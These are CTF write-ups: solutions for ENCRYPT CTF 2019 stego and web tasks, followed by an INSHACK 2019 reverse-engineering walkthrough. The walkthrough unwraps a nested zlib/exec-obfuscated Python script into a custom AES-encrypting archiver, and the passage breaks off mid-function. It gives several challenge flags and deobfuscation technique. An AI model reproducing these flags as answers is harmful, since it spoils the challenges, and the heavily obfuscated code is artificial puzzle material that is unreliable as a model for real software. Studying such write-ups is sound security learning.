Run this and here we go:
![solved](./src/solved.png)

Flag: `encryptCTF{1t_w4s_h4rd3r_th4n_1_th0ught}`


### File: CTF-Writeups/ENCRYPT CTF 2019/Stegano/Into The Black/README.md

# Into The Black

## Task

![task](./src/task.png)

[IntoTheBlack.png](./src/IntoTheBlack.png)

## Solution

We have got the image:
![IntoTheBlack.png](./src/IntoTheBlack.png)

Open it through stegsolve and process a little:

![stegsolve](./src/stegsolve.png)

Flag: `encryptCTF{L1GH7_17_UP}`



### File: CTF-Writeups/ENCRYPT CTF 2019/Web/Slash slash/README.md

# Slash slash

## Task

![task](./src/task.png)

[handout_slashslash.7z](./src/handout_slashslash.7z)
## Solution

Extracting file will give us folder with web application. I think, author thought we will run this, but all I did is looked through files. In the app/env/bin/activate file I found this:

![active](./src/active.png)

And I tried to decode base64 and here is the flag:
`encryptCTF{comments_&_indentations_makes_johnny_a_good_programmer}`


### File: CTF-Writeups/INSHACK 2019/Reverse/Obscure File Format/README.md

# Obscure File Format

## Task

![task](./src/task.png)

[obscure-file-format.zip](./src/obscure-file-format.zip)

## Solution
---

### Understanding archive

Unpacking archive gives me three files: a, k and l. I open them with 010Editor to find out what are these files. a and k have strange headers and l file is the Python script.

a:

![a](./src/a.png)

k:

![k](./src/k.png)

l:

![l](./src/l.png)

Let's look at the script closer:

```Python
#!/usr/bin/env python3
import zlib;exec(zlib.decompress(<long_string_of_bytes>))
```

Script executes decompressed bytes. I change `exec` to `print` to look what code is being executed:

![decompressed](./src/decompressed1.png)

And again I have hex string, which being executed after unhexlify. I again change `exec` to `print` and get `zlib.decompress` again. That's just annoing... But after doing this:

```Python
#!/usr/bin/env python3
import zlib
s = zlib.decompress(<long_string_of_bytes>)

s = s.replace(b"exec", b"s1 = ")
exec(s)
print(s1)
s1 = s1.replace(b"exec", b"s2 = ")
exec(s1)
#print(s2)
s2 = s2.replace(b"exec", b"s3 = ")
exec(s2)
#print(s3)
s3 = s3.replace(b"exec", b"s4 = ")
exec(s3)
#print(s4)
s4 = s4.replace(b"exec", b"s5 = ")
exec(s4)
print(s5.decode())
```

I finnaly get the real code:

```Python

import os as _4491ba09efd64d32a7c316a89ed23540
import uuid as _9c0223fbd33e432cad291e3626fa8375
import zlib as _75efb4b5390e450f86339bb370cf9798
import struct as _460dcfe1367b4351bfd11161e6afb4bc
import random as _93208a26d2354ca58a2d63a1775b429e
import pathlib as _fc2e6885d4f6459c9173119853a9b941
import argparse as _d80254fe3b7f406a91ec7ea2a813e6ee
import cryptography.hazmat.backends as _95637ffc24f64183a0e5cab581866201
import cryptography.hazmat.primitives.ciphers as _12fe06755daf4d66ac222ee97d41fa8f
_d92c89d5c8e6480ab83f62d04ac6968e = zip
_2a054c268d044e6ab9b9ba49b0c99ac2 = vars
_efe18136e1d14a66b014f121b6cdc599 = type
_9013c61b775f4709917f60cfb4c4d0bd = tuple
_c78251a8b4ef4e5c975562404153eca2 = super
_05314ca66c8241329018829d41388221 = sum
_edce3f96a97f4268b7f758ebbee92e39 = str
_f1216e22142a40e6b2f2bef9bad97dc8 = staticmethod
_db7a1923e60b407e8946626fbda97a39 = sorted
_d3cfb7be150c4d6b9165bd6b4f256280 = slice
_777f2cfa06f040478891a09e204ce442 = setattr
_419debbaf6fa40fe8eed1a33ff7b5054 = set
_c0bd2003dfbd4a949b356f6691484af0 = round
_b95dfc84bafb470689533c3746352ddb = reversed
_a011ae99a45b40099121c0fd1a164aab = repr
_3fa9f86ba17f44e7b990bb639c51f3bf = range
_5a9ea9db9e3443f4ab9f4e2e7172d69f = quit
_0aa77fc2a6db4be4b58865ae4d13913a = property
_7337aa3caf7c4d9f855a7a241a9db8be = print
_639a2e6f41b041688856eac61a7ef244 = pow
_c4754cee9f0f4a5186b99594618a9117 = ord
_a66abde4ce3048488263de1cf9695616 = open
_31a7f57a7890416bbfdfa14fac4b4494 = oct
_0614c181390346469e56dd3c5cc69382 = object
_4dc860aba19640d18df6a9fa82ea8812 = next
_5b7d659104324bb6b5174effb661c82c = min
_2a279817dc8d4df19368574962ec6989 = memoryview
_4fd1101920684bd3927e0078ffb7d058 = max
_5dbd8f8702d54135af11719ac747cfe2 = map
_7cfbebcc486f4728be51e3a5d1f71647 = locals
_348deb41107f440ea6e05f9eda40e243 = list
_c87f53df47af43549034cffa618848db = license
_c8ab51b417d843f8982ae6704e9764b7 = len
_2bd4fb19079542f5af4f05eadb9daba3 = iter
_e2a25b47df0e4314bfd8f6ffe9046488 = issubclass
_81359519d9044e34873e4053c9463167 = isinstance
_f10babe329654a188b28f15547ad4266 = int
_e3c36eecddfc40808308f7ac76f7e3da = input
_3b194946a125498bb9bee24a49474cdd = id
_ea130bd1ad0c4582b7bbfffcede80554 = hex
_65c9b6af369543f5a71b061ff59d96c8 = help
_e2fa667106eb4c60b93fe4229ea6d139 = hash
_72892c873557438e8eb844be66a3ff85 = hasattr
_e0fc264a76004088918712d418a5e58f = globals
_522c60ce347148b48ebad87bf7068b52 = getattr
_899c6496c4b44e4391a948383a48fada = frozenset
_0e010ed24c9943e0b9013beb5fc4ccf3 = format
_51b28eae00284b80a9defd2e01091ded = float
_e6701fe56f97478aae26772cabfcd254 = filter
_3c391a07ac7e477693cf839aebb7f398 = exit
_f848d99ec4e944bea232e5030c19a95a = exec
_aa2bcc1974fa4423b2050897cd493316 = eval
_b2261f5204dc405292771a0b6133b2a2 = enumerate
_ddb7c8ba43364282bbca52e4ec4da69d = divmod
_0bafc82047ed441eb6d2ce8aedb627b8 = dir
_b03bf30bc9934bbc94a982a98e62d177 = dict
_997004a17c604134a99ff104997794d5 = delattr
_346d22a2f78b490eb4abf1776039ac93 = credits
_d18ec62a1b564a37aca192701c307993 = copyright
_25b999825d284b07a1177f207e00f46b = complex
_2030c6bde0b04af28e1b6c2ac1994c03 = compile
_24c6add9b5f643b7af9ac9adc7a8f88e = classmethod
_6eae669a5caa49d3b2cf0ca94f1db62a = chr
_7e5a105ca35c401f8baf2399f841bf48 = callable
_6437cd5ae5444b6ea6b5517489961678 = bytes
_b17c67f75d1f4950b5d9bf1b9bae0977 = bytearray
_0d8659b28a63481797b57a6cbd45979b = breakpoint
_16d9ebd528c54cfcab70919505c51c47 = bool
_093c82ee06b04c548518d151aadeff09 = bin
_9ec3c131d0704d198077b653f534f2e3 = ascii
_a5eadde352fc4e9185c23382c6609d05 = any
_478d1f17762441ffbcdf51ad03452e5e = all
_6e47d9017bfc4bb0b457e8fc7d37e061 = abs
_c003e61a683c4d48992c5968730f88de = __spec__
_120f0ca155a54f17b3a8a7139481d201 = __package__
_0725a4328dac4b608bca988314e49535 = __name__
_d04e26a1c11b42e6b6d4a19928378a10 = __loader__
_0afcf66370f24a46833b16ad68e51f33 = __import__
_936c716b36354788811726a511d820be = __doc__
_55b22c1393fd4ddb92e5b741516a9b49 = __debug__
_2fa87f4a68a34d7585f804c2d1f41d8b = __build_class__
_98fc8056914d49c18cfc6f2219605829 = ZeroDivisionError
_e0c1d917c66d4bf9bff6985270d24836 = Warning
_c1f0aa22b0414c10a669df1dd85dcc5b = ValueError
_d6198e1bf52740108a3a42c6aad41bb4 = UserWarning
_f751b328ae0f485981b8bd5eb4e9bce9 = UnicodeWarning
_7dec97b6daf0458894941228aca1bfb1 = UnicodeTranslateError
_4268dd7edaf9417fa43e9be4aab0cd79 = UnicodeError
_d847bf32c8704332ace814998a0b55fc = UnicodeEncodeError
_0e36ecc15fd84c75a50b8f59ff5a5633 = UnicodeDecodeError
_6f42769b59284276b9847cf82cb9e732 = UnboundLocalError
_23325e647bc447be86fdde3963c18734 = TypeError
_33186cdf76944c1d8b235829cede199b = True
_d021c6575bbc469cb3dc2a7be381022d = TimeoutError
_014da739ca3a4b06be1a815eb0fd2bc0 = TabError
_9385ba93ab3d4765b062e08dee9baf24 = SystemExit
_ebc7db66319b4ba1a5a7865325d86019 = SystemError
_b7ebf253050d4e67813b1fba8ca241c1 = SyntaxWarning
_8243d700f5e5400c9e6ffa38f41fe0b7 = SyntaxError
_77d15c4c7fe74e309d9141093345fc8f = StopIteration
_e1d49ccdec594d3683ddef929fb2de1d = StopAsyncIteration
_831260914b4548099ba08b15626ef911 = RuntimeWarning
_8efed85bd266402d96f4aa0c69ca8148 = RuntimeError
_66a9c8f0a7d9470d944ee5e14ab8e79d = ResourceWarning
_634016e1846b4a7b923053fcb3e1565e = ReferenceError
_29f4425faf3d4c8899cc92292af76672 = RecursionError
_8b8ff3f8f43e462c9855121ecbfea04e = ProcessLookupError
_63e9fbc6e17147099f6a47451c9e82f8 = PermissionError
_cab5b8077f6c45e09ca00e004ccd400b = PendingDeprecationWarning
_ff4432d6f55b400d95328f612b5ba96f = OverflowError
_205032881b6a45358361d372f9a459e5 = OSError
_9f17921228d94053ab5e9be06564e00b = NotImplementedError
_45bd2ece2d8144089db1250e693b6955 = NotImplemented
_525e02de1e7d4052902b617bd217a120 = NotADirectoryError
_5187fd7516d543cc9e8f5f4d07af0127 = None
_979aadb5a42b4700be5b1aeb4e5a6126 = NameError
_a57f0c320cbb460caebb3e6d60d1ab49 = ModuleNotFoundError
_4aa3364354404416bf653110db8b5f17 = MemoryError
_2d8d17a034f944f492f77a3090eb58e4 = LookupError
_738d1cfd7d2542c68658c7d3d017c0a2 = KeyboardInterrupt
_d48277b0ec574d2489a7b2d612172bc7 = KeyError
_e8d81e7a193e41c2bf29c3899eb80c23 = IsADirectoryError
_4b32820c8f774440a5513983342f567f = InterruptedError
_bd3d00948899431abe6bd1c175f2b73b = IndexError
_d59fd9d5e9354600947cda5b3c6df251 = IndentationError
_d7b077fba764425393caa4af02032a04 = ImportWarning
_3a24cea06d114692b9a9c30440d97463 = ImportError
_d3339297e89141e0816639ead8eda554 = IOError
_584d0ff625c64024bc1290696f9b7277 = GeneratorExit
_443b13233cef4242afbf624336c4d455 = FutureWarning
_45f63936e0d2414f81f97e9fe562c734 = FloatingPointError
_66299359ebad416a9be7d03a54485ba7 = FileNotFoundError
_091dbd374eac4d218391f5d651aa5242 = FileExistsError
_9656b9e60ace40ab958f7005bb4ca86f = False
_78174034c577445f8c0a1c0379d54c86 = Exception
_7609428dbb2a4d0e93506071a0ba0003 = EnvironmentError
_aa69ae8b32464738b560cc318d6d6cbd = Ellipsis
_31b362ac0a864b0f891a514ad2b99774 = EOFError
_a651b511b6c3433daa715ca47ab70bd1 = DeprecationWarning
_1139f6d266694855b98ba9164af9d6c4 = ConnectionResetError
_7c1ff231fd4c49b28f09dc7df8e7dcbf = ConnectionRefusedError
_de6cd85ed278495fa686516e82cba23e = ConnectionError
_1f76b7498c3c4835acc4360d0a1999bf = ConnectionAbortedError
_23ab01b513664ab48df51f48da1d043e = ChildProcessError
_7e3d650f08f144c7b45458259a3f086a = BytesWarning
_97bed9e33fe144929a25040decd80656 = BufferError
_edac437610fd4c07844622f0fd1baffa = BrokenPipeError
_3ee3a1fac5014afea896ce4211ef02d8 = BlockingIOError
_c434de818c704fa3a27552ce0b8322a7 = BaseException
_c7b4e9c604d048629516921ebc82f6bb = AttributeError
_502a41dc53fa48f38a23fd45fa028128 = AssertionError
_3eeb35891ea0407bb5e23cb15b3d2877 = ArithmeticError
_f82b10a5ace546908c2c36dbebfcf17b = _6437cd5ae5444b6ea6b5517489961678([0])
_e1548e812dba46738c65df7858044dcd = (0x484203ad//0xd2ece70f+0x4b8bbafd-0xd2ece70f//0x484203ad+0xd2ece70f//0x484203ad+0x00000010-0x484203ad//0xd2ece70f-0x4b8bbafd)
_bc51f568ca504f20ad983c0606d64c46 = (0xd7097633//0xd78412ad+0x4e6c894a-0xd78412ad//0xd7097633+0xd78412ad//0xd7097633+0x00000010-0xd7097633//0xd78412ad-0x4e6c894a)
_bcf41878aadd4b6295ae4593ed070e51 = _95637ffc24f64183a0e5cab581866201.default_backend()

class _6c9939e78b674d19a284a5c6c83fc918():

    def __init__(_81d6b4d26118467ba5c0ea1aad0cf09c):
        _81d6b4d26118467ba5c0ea1aad0cf09c._9b97d955e1944c5b9e692d9b9f4a8098 = _4491ba09efd64d32a7c316a89ed23540.urandom(_e1548e812dba46738c65df7858044dcd)
        _81d6b4d26118467ba5c0ea1aad0cf09c._5a07b64d8f2f4a47812b6422c0c97507 = _4491ba09efd64d32a7c316a89ed23540.urandom(_bc51f568ca504f20ad983c0606d64c46)
        _81d6b4d26118467ba5c0ea1aad0cf09c._5521d2a7fcd54ee78c0db20c3da05c68 = _12fe06755daf4d66ac222ee97d41fa8f.Cipher(_12fe06755daf4d66ac222ee97d41fa8f.algorithms.AES(_81d6b4d26118467ba5c0ea1aad0cf09c._5a07b64d8f2f4a47812b6422c0c97507), _12fe06755daf4d66ac222ee97d41fa8f.modes.CBC(_81d6b4d26118467ba5c0ea1aad0cf09c._9b97d955e1944c5b9e692d9b9f4a8098), backend=_bcf41878aadd4b6295ae4593ed070e51)

    def __str__(_7f540a4ea31f4927af8f0e0ef73adb1c):
        return f'[{_7f540a4ea31f4927af8f0e0ef73adb1c._9b97d955e1944c5b9e692d9b9f4a8098.hex()}|{_7f540a4ea31f4927af8f0e0ef73adb1c._5a07b64d8f2f4a47812b6422c0c97507.hex()}]'

    def _0c1a9f7b3f49433ca2783206451f4646(_4999e3dbda004a2396d371a4e1956e6a, _2ccf64e8350f440bb5e89bedcc5edbde: 'bytes'):
        _83e1be4e03e041cbb2b03e76c03d0dd2 = _4999e3dbda004a2396d371a4e1956e6a._5521d2a7fcd54ee78c0db20c3da05c68.encryptor()
        return (_83e1be4e03e041cbb2b03e76c03d0dd2.update(_2ccf64e8350f440bb5e89bedcc5edbde) + _83e1be4e03e041cbb2b03e76c03d0dd2.finalize())

    def _815d1afe44124d8eae315380e4e8287c(_3456f3a7553c40309300a1d491ee4cb0):
        _7de3041e057e4d07afdd1ee49ebfb830 = _348deb41107f440ea6e05f9eda40e243((_3456f3a7553c40309300a1d491ee4cb0._9b97d955e1944c5b9e692d9b9f4a8098 + _3456f3a7553c40309300a1d491ee4cb0._5a07b64d8f2f4a47812b6422c0c97507))
        _7de3041e057e4d07afdd1ee49ebfb830.reverse()
        return _6437cd5ae5444b6ea6b5517489961678(_7de3041e057e4d07afdd1ee49ebfb830)

def _9a7489b61e0c42afa68070b62b9efcda(_c60c2dd6274144e18db87caf5f72ee6b: 'bytes', _182d6337ab934a42a416f1b049dab775: 'int'):
    _6531a429ed3943deb55803b86aec919a = (_182d6337ab934a42a416f1b049dab775 - (_c8ab51b417d843f8982ae6704e9764b7(_c60c2dd6274144e18db87caf5f72ee6b) % _182d6337ab934a42a416f1b049dab775))
    return (_c60c2dd6274144e18db87caf5f72ee6b + _6437cd5ae5444b6ea6b5517489961678(([_6531a429ed3943deb55803b86aec919a] * _6531a429ed3943deb55803b86aec919a)))

class _d1eebf20b14449edbfa0f916a8d3c8f6():
    _9c21f72031e04cb98f099d1a0246503e = (0xd3de8ee8//0x872037f1+0xe2b856ef-0x872037f1//0xd3de8ee8+0x872037f1//0xd3de8ee8+0x00000080-0xd3de8ee8//0x872037f1-0xe2b856ef)
    _148c8eb638934dcba67f900088441ac7 = (0x2f714779//0x7cdb17aa+0x5c50d277-0x7cdb17aa//0x2f714779+0x7cdb17aa//0x2f714779+0x00000010-0x2f714779//0x7cdb17aa-0x5c50d277)

    def __init__(_534f921a4393497d9ac94015aeae5617, _6b7fb1826bb440d587a96e53f26a46b4: 'ArchiveEntry'):
        _534f921a4393497d9ac94015aeae5617._ece9d23a9efd40d4850480dca4d2e7d2 = _6b7fb1826bb440d587a96e53f26a46b4
        _534f921a4393497d9ac94015aeae5617._44f49761f6d84834afed02a29d89be25 = _6c9939e78b674d19a284a5c6c83fc918()
        _534f921a4393497d9ac94015aeae5617._ef37cdce325341e9a26eb9f803685760 = {
            
        }

    def __str__(_e9fc5e044bd1411582713d70fd9149d1):
        return f'[{_e9fc5e044bd1411582713d70fd9149d1._ece9d23a9efd40d4850480dca4d2e7d2._06ee492dd4d84f7da54871038bd812cc}|{_e9fc5e044bd1411582713d70fd9149d1._44f49761f6d84834afed02a29d89be25}]'

    def _9fa3e14a60214abe9bbe0270ed83bd0f(_c1b2f8c8e69c4f9185a724d3b121eb7c):
        if (not _c1b2f8c8e69c4f9185a724d3b121eb7c._ef37cdce325341e9a26eb9f803685760):
            raise _8efed85bd266402d96f4aa0c69ca8148('Serializing key before data...')
        _2aa47d4050d142bbba7a44fc1ed9b1b0 = _c1b2f8c8e69c4f9185a724d3b121eb7c._ece9d23a9efd40d4850480dca4d2e7d2._06ee492dd4d84f7da54871038bd812cc.bytes
        _2aa47d4050d142bbba7a44fc1ed9b1b0 += _c1b2f8c8e69c4f9185a724d3b121eb7c._44f49761f6d84834afed02a29d89be25._815d1afe44124d8eae315380e4e8287c()
        _2aa47d4050d142bbba7a44fc1ed9b1b0 += _460dcfe1367b4351bfd11161e6afb4bc.pack('I', _c8ab51b417d843f8982ae6704e9764b7(_c1b2f8c8e69c4f9185a724d3b121eb7c._ef37cdce325341e9a26eb9f803685760))
        for (_363dc44808094e7c8101d0341f382bd5, _b2438fe367754c95a518970372122531) in _c1b2f8c8e69c4f9185a724d3b121eb7c._ef37cdce325341e9a26eb9f803685760.items():
            _2aa47d4050d142bbba7a44fc1ed9b1b0 += _460dcfe1367b4351bfd11161e6afb4bc.pack('2I', _363dc44808094e7c8101d0341f382bd5, _b2438fe367754c95a518970372122531)
        return _2aa47d4050d142bbba7a44fc1ed9b1b0

    def _0631e8b42e7c454594b97b0ab0a16d24(_1062e8f7bca247b892aa26f6d18192ed):
        with _1062e8f7bca247b892aa26f6d18192ed._ece9d23a9efd40d4850480dca4d2e7d2._d585684e5ba04013a5b1da4d6f098aef.open('rb') as _1cad6e83fa5148088137ef948a1e73fe:
            _bd435700d5854578b4ad470e171e93a2 = _1cad6e83fa5148088137ef948a1e73fe.read()
        _575abe6bd801421dac69f5dde8f554b1 = _9a7489b61e0c42afa68070b62b9efcda(_75efb4b5390e450f86339bb370cf9798.compress(_bd435700d5854578b4ad470e171e93a2), _d1eebf20b14449edbfa0f916a8d3c8f6._148c8eb638934dcba67f900088441ac7)
        _bef41c19b31748e9b54b7698e429cd4e = _9a7489b61e0c42afa68070b62b9efcda(_1062e8f7bca247b892aa26f6d18192ed._44f49761f6d84834afed02a29d89be25._0c1a9f7b3f49433ca2783206451f4646(_575abe6bd801421dac69f5dde8f554b1), _d1eebf20b14449edbfa0f916a8d3c8f6._9c21f72031e04cb98f099d1a0246503e)
        _624e802533af4165b6f016788854b728 = (_c8ab51b417d843f8982ae6704e9764b7(_bef41c19b31748e9b54b7698e429cd4e) // _d1eebf20b14449edbfa0f916a8d3c8f6._9c21f72031e04cb98f099d1a0246503e)
        _e3b9b0397c574e4fb7126b8c8c327587 = _348deb41107f440ea6e05f9eda40e243(_3fa9f86ba17f44e7b990bb639c51f3bf(_624e802533af4165b6f016788854b728))
        _93208a26d2354ca58a2d63a1775b429e.shuffle(_e3b9b0397c574e4fb7126b8c8c327587)
        for (_ff9542e4689548338f158d8e1574695c, _3e9224086d094d1fa7fb33361e7953d1) in _d92c89d5c8e6480ab83f62d04ac6968e(_348deb41107f440ea6e05f9eda40e243(_3fa9f86ba17f44e7b990bb639c51f3bf(_624e802533af4165b6f016788854b728)), _e3b9b0397c574e4fb7126b8c8c327587):
            _1062e8f7bca247b892aa26f6d18192ed._ef37cdce325341e9a26eb9f803685760[_ff9542e4689548338f158d8e1574695c] = _3e9224086d094d1fa7fb33361e7953d1
        _7621859a4b254bbf8bacb0c28f4c469b = [_bef41c19b31748e9b54b7698e429cd4e[(_26d188067b8b491cae5aa64baec35f96 * _d1eebf20b14449edbfa0f916a8d3c8f6._9c21f72031e04cb98f099d1a0246503e):((_26d188067b8b491cae5aa64baec35f96 + (0x0e0901e2//0x2938e1ad+0xe38ba340-0x2938e1ad//0x0e0901e2+0x2938e1ad//0x0e0901e2+0x00000001-0x0e0901e2//0x2938e1ad-0xe38ba340)) * _d1eebf20b14449edbfa0f916a8d3c8f6._9c21f72031e04cb98f099d1a0246503e)] for _26d188067b8b491cae5aa64baec35f96 in _3fa9f86ba17f44e7b990bb639c51f3bf(_624e802533af4165b6f016788854b728)]
        _fe1a85c9c22949ceb1fd6a1020ab792b = _6437cd5ae5444b6ea6b5517489961678([])
        for _97b6123ce4224cec95a5b822de64d6ef in _3fa9f86ba17f44e7b990bb639c51f3bf(_624e802533af4165b6f016788854b728):
            _fe1a85c9c22949ceb1fd6a1020ab792b += _7621859a4b254bbf8bacb0c28f4c469b[_1062e8f7bca247b892aa26f6d18192ed._ef37cdce325341e9a26eb9f803685760[_97b6123ce4224cec95a5b822de64d6ef]]
        return _fe1a85c9c22949ceb1fd6a1020ab792b

class _c1f55bb831d144058e27ac1a85645c87():

    def __init__(_731b530ad0da4d808027d9ef88d282ca, _dabc8ad63e2742d0b88bc5ceff3cd3af: 'pathlib.Path'):
        _731b530ad0da4d808027d9ef88d282ca._0a0ba676f62e40e5bca6eb786b6694a5 = _dabc8ad63e2742d0b88bc5ceff3cd3af
        _731b530ad0da4d808027d9ef88d282ca._bfa105cae18142edad7cf6334c9f92c6 = _9c0223fbd33e432cad291e3626fa8375.uuid4()
        _731b530ad0da4d808027d9ef88d282ca._8e6a7835576e4afab10617ad8a8d5e71 = _dabc8ad63e2742d0b88bc5ceff3cd3af.stat()

    def __str__(_6588976a457e416d85caf62be9ef0ba7):
        return f'[{_6588976a457e416d85caf62be9ef0ba7._bfa105cae18142edad7cf6334c9f92c6}|{_6588976a457e416d85caf62be9ef0ba7._0a0ba676f62e40e5bca6eb786b6694a5}]'

    @_0aa77fc2a6db4be4b58865ae4d13913a
    def _06ee492dd4d84f7da54871038bd812cc(_e7336ee71b4e43a591322f2a1167cd9d):
        return _e7336ee71b4e43a591322f2a1167cd9d._bfa105cae18142edad7cf6334c9f92c6

    @_0aa77fc2a6db4be4b58865ae4d13913a
    def _d585684e5ba04013a5b1da4d6f098aef(_2245263e25e144e6aed88e5758487e80):
        return _2245263e25e144e6aed88e5758487e80._0a0ba676f62e40e5bca6eb786b6694a5

    @_0aa77fc2a6db4be4b58865ae4d13913a
    def _c01f8a123fcd45018820d0d67e56a4d4(_46b1595b6f394d81849b5a4412d9fdc4):
        return _edce3f96a97f4268b7f758ebbee92e39(_46b1595b6f394d81849b5a4412d9fdc4._0a0ba676f62e40e5bca6eb786b6694a5)

    @_0aa77fc2a6db4be4b58865ae4d13913a
    def _8d47c3e6f91b4457ab4824a94c3ca559(_d300fea64ef54946b37feadbbb4e740c):
        return _d300fea64ef54946b37feadbbb4e740c._8e6a7835576e4afab10617ad8a8d5e71.st_size

    @_0aa77fc2a6db4be4b58865ae4d13913a
    def _ef27e5ccb5fc441db57e7f4c7054edd4(_b986946400594a2bb288b726d0d92266):
        return _b986946400594a2bb288b726d0d92266._8e6a7835576e4afab10617ad8a8d5e71.st_mode

    @_0aa77fc2a6db4be4b58865ae4d13913a
    def _d408bf1956a34e4c9cc044210d3c4e0b(_3bd1d32bede34ba89abf3565f6c2b62e):
        return _3bd1d32bede34ba89abf3565f6c2b62e._8e6a7835576e4afab10617ad8a8d5e71.st_atime

    @_0aa77fc2a6db4be4b58865ae4d13913a
    def _3d786168c4324120bf3b148b16eec9b4(_0f431376582e4df59c8ddf733f1bb2bd):
        return _0f431376582e4df59c8ddf733f1bb2bd._8e6a7835576e4afab10617ad8a8d5e71.st_mtime

    @_0aa77fc2a6db4be4b58865ae4d13913a
    def _d22c57dbf295449c9b2503225362d1e3(_74a0878367e3470ca5a4fd155ca46977):
        return _74a0878367e3470ca5a4fd155ca46977._8e6a7835576e4afab10617ad8a8d5e71.st_ctime

    def _b7fb031ea43143438b91cbe9a209b22b(_b27272ac04484118af6833b5f783e0ca):
        _99e3ec18a596462a99d2615c3455dcf3 = (_b27272ac04484118af6833b5f783e0ca._c01f8a123fcd45018820d0d67e56a4d4.encode() + _f82b10a5ace546908c2c36dbebfcf17b)
        _ba75d39306554e4ca3d16e0827d701fa = _460dcfe1367b4351bfd11161e6afb4bc.pack('I', _c8ab51b417d843f8982ae6704e9764b7(_99e3ec18a596462a99d2615c3455dcf3))
        _ba75d39306554e4ca3d16e0827d701fa += _99e3ec18a596462a99d2615c3455dcf3
        _ba75d39306554e4ca3d16e0827d701fa += _b27272ac04484118af6833b5f783e0ca._06ee492dd4d84f7da54871038bd812cc.bytes
        _ba75d39306554e4ca3d16e0827d701fa += _460dcfe1367b4351bfd11161e6afb4bc.pack('2I', _b27272ac04484118af6833b5f783e0ca._8d47c3e6f91b4457ab4824a94c3ca559, _b27272ac04484118af6833b5f783e0ca._ef27e5ccb5fc441db57e7f4c7054edd4)
        _ba75d39306554e4ca3d16e0827d701fa += _460dcfe1367b4351bfd11161e6afb4bc.pack('3d', _b27272ac04484118af6833b5f783e0ca._d408bf1956a34e4c9cc044210d3c4e0b, _b27272ac04484118af6833b5f783e0ca._3d786168c4324120bf3b148b16eec9b4, _b27272ac04484118af6833b5f783e0ca._d22c57dbf295449c9b2503225362d1e3)
        return _ba75d39306554e4ca3d16e0827d701fa

class _9420e2c7260442d3866a58615a4cc0ba():
    _53bb332cf4574683a5a8a0e16b163bb8 = _6437cd5ae5444b6ea6b5517489961678([76, 48, 76, 75, 83, 84, 82, 0])

    def __init__(_e95f5bf0402146d9a32868b2f4511410):
        _e95f5bf0402146d9a32868b2f4511410._6c6e11fd99354ff3a889fc5fb70f5ab2 = []

    def _41ea90d86def4a5788d1c69c92d19522(_6167aa2502d64e2f8560e87aa79753fe, _35a5ca3044904ab1b5b686a315bbb3a8: 'ArchiveEntry'):
        _65ea863f7e5b4065976030b97f50bebd = _d1eebf20b14449edbfa0f916a8d3c8f6(_35a5ca3044904ab1b5b686a315bbb3a8)
        _7337aa3caf7c4d9f855a7a241a9db8be(_65ea863f7e5b4065976030b97f50bebd)
        _6167aa2502d64e2f8560e87aa79753fe._6c6e11fd99354ff3a889fc5fb70f5ab2.append(_65ea863f7e5b4065976030b97f50bebd)
        return _65ea863f7e5b4065976030b97f50bebd

    def _db89af45a2c6466882953dad123fb736(_60642284da8c41378cb71474dc31f8ab, _edefccf2a66b4f819dcc4d8d9143ffc3: 'pathlib.Path'):
        _9c790f7015d6415aa1bea20eadf61c03 = _9420e2c7260442d3866a58615a4cc0ba._53bb332cf4574683a5a8a0e16b163bb8
        _9c790f7015d6415aa1bea20eadf61c03 += _460dcfe1367b4351bfd11161e6afb4bc.pack('I', _c8ab51b417d843f8982ae6704e9764b7(_60642284da8c41378cb71474dc31f8ab._6c6e11fd99354ff3a889fc5fb70f5ab2))
        for _f9f492192b064ab9b5426a1ecd6a85dc in _60642284da8c41378cb71474dc31f8ab._6c6e11fd99354ff3a889fc5fb70f5ab2:
            _9c790f7015d6415aa1bea20eadf61c03 += _f9f492192b064ab9b5426a1ecd6a85dc._9fa3e14a60214abe9bbe0270ed83bd0f()
        _edefccf2a66b4f819dcc4d8d9143ffc3.joinpath('keystore').write_bytes(_9c790f7015d6415aa1bea20eadf61c03)

class _9b5737cb2ddb4cafac4e8fa8db81fb4b():
    _c4a58d87b0b64df2a3abb595be3d37bb = _6437cd5ae5444b6ea6b5517489961678([76, 48, 76, 65, 82, 67, 72, 0])
    _ebbec7423e3a49a5ba676913d5592eea = (((0xd1e6024e//0x2cac1fd8+0xd516fdc5-0x2cac1fd8//0xd1e6024e+0x2cac1fd8//0xd1e6024e+0x00000400-0xd1e6024e//0x2cac1fd8-0xd516fdc5) * (0xce9939ce//0x65d2f2bb+0x2b7f2291-0x65d2f2bb//0xce9939ce+0x65d2f2bb//0xce9939ce+0x00000400-0xce9939ce//0x65d2f2bb-0x2b7f2291)) * (0xd2fd3a25//0xf0fc6a15+0x93f468d5-0xf0fc6a15//0xd2fd3a25+0xf0fc6a15//0xd2fd3a25+0x00000001-0xd2fd3a25//0xf0fc6a15-0x93f468d5))

    def __init__(_2679665fa7b44c2b8fac921d46efe124):
        _2679665fa7b44c2b8fac921d46efe124._6ec0b5915a0a48fd83b697329bce98ee = []
        _2679665fa7b44c2b8fac921d46efe124._923eb7b1bd0f40ad8bf244a1a91b729c = _9420e2c7260442d3866a58615a4cc0ba()

    def _5f8f129324e640809d01bddc294aaa1e(_0d49b8045b8a478daf0c8283646bc5dc, _2ab9ed96502445a0b224909942537c76: 'pathlib.Path'):
        _a6ba007b0281481da62829a693bfd4a4 = _c1f55bb831d144058e27ac1a85645c87(_2ab9ed96502445a0b224909942537c76)
        _7337aa3caf7c4d9f855a7a241a9db8be(_a6ba007b0281481da62829a693bfd4a4)
        if (_a6ba007b0281481da62829a693bfd4a4._8d47c3e6f91b4457ab4824a94c3ca559 > _9b5737cb2ddb4cafac4e8fa8db81fb4b._ebbec7423e3a49a5ba676913d5592eea):
            raise _8efed85bd266402d96f4aa0c69ca8148(f'{_a6ba007b0281481da62829a693bfd4a4._d585684e5ba04013a5b1da4d6f098aef} size is above the limit ({_9b5737cb2ddb4cafac4e8fa8db81fb4b._ebbec7423e3a49a5ba676913d5592eea})!')
        _afab763a2972461cbc7bf2068f7a8515 = _0d49b8045b8a478daf0c8283646bc5dc._923eb7b1bd0f40ad8bf244a1a91b729c._41ea90d86def4a5788d1c69c92d19522(_a6ba007b0281481da62829a693bfd4a4)
        _0d49b8045b8a478daf0c8283646bc5dc._6ec0b5915a0a48fd83b697329bce98ee.append((_a6ba007b0281481da62829a693bfd4a4, _afab763a2972461cbc7bf2068f7a8515))

    def _6d9fd80d4dd64ec79fcb9665c4c3d5d6(_6449e9edd5ba4b9ea64dada85dbcb387, _7e4af007183a40d98f41b11fff9394e6: 'pathlib.Path'):
